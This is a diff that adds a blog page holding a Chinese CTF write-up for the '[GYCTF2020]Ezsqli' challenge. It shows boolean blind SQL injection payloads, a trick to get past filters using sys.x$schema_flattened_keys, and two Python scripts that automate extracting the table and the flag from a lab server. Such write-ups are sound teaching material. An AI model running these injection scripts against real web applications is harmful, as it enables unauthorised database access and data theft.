@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[GYCTF2020]Ezsqli - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[GYCTF2020]Ezsqli
+布尔盲注
+无列名注入
+
+用0，1，2，3测试
+分别返回
+Error Occured When Fetch Result
+Nu1L
+V&amp;amp;N
+Error Oc,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[GYCTF2020]Ezsqli</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[GYCTF2020]Ezsqli</h1>
+        <div class="stuff">
+            <span>六月 30, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><ul>
+<li>布尔盲注</li>
+<li>无列名注入</li>
+</ul>
+<p>用0，1，2，3测试</p>
+<p>分别返回</p>
+<p>Error Occured When Fetch Result</p>
+<p>Nu1L</p>
+<p>V&amp;N</p>
+<p>Error Occured When Fetch Result.</p>
+<p>测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^1</span><br></pre></td></tr></table></figure>
+
+<p>返回Error Occured When Fetch Result.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^0</span><br></pre></td></tr></table></figure>
+
+<p>返回Nu1L</p>
+<p>可以布尔盲注</p>
+<p>1^(ascii(substr(database(),1,1))&gt;0)#   返回Error Occured When Fetch Result.</p>
+<p>1^(ascii(substr(database(),1,1))&lt;0)#   返回Nu1L</p>
+<p>写脚本</p>
+<p>因为or被过滤了，information_schema库用不了，使用sys.x$schema_flattened_keys来爆表名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://53aba0e6-30b3-4d30-8284-52d6fcc75c71.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high=<span class="number">137</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">&#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),%d,1))&gt;%d)#&#x27;</span>%(x,mid)</span><br><span class="line">        <span class="comment">#payload=&#x27;1^(ascii(substr(database(),%d,1))&gt;%d)#&#x27;%(x,mid)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(high+low)//<span class="number">2</span></span><br><span class="line">    flag+=chr(int(mid))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后无列名注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://53aba0e6-30b3-4d30-8284-52d6fcc75c71.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">x=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        flag=x+chr(i)</span><br><span class="line">        payload = <span class="string">&quot;1&amp;&amp;((1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.format(flag)</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            x=x+chr(i<span class="number">-1</span>)</span><br><span class="line">            print(x)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
